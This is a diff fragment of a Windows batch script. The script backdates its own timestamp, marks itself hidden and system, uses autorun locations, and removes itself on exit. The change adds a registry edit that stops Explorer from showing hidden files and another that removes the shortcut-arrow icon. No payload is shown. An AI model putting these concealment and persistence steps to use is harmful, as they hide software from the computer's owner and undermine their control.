@@ -81,7 +81,8 @@ if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg 
 %module_fileTouch% /w /a /c /d %app_date% "%~dpnx0"
 attrib +h +r +s "%~dpnx0"
 
-(reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /t REG_SZ /d "%windir%\System32\shell32.dll,-50" /f)>nul 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v Hidden /t REG_DWORD /d 2 /f >nul
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\shell32.dll,-50" /f >nul
 
 
 
@@ -203,6 +204,8 @@ goto :cycle
 
 
 :selfRemover
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f >nul
+
 if exist "%path_autoRun1%\%~nx0" (
   attrib -h -r -s "%path_autoRun1%\%~nx0"
   del /q "%path_autoRun1%\%~nx0"
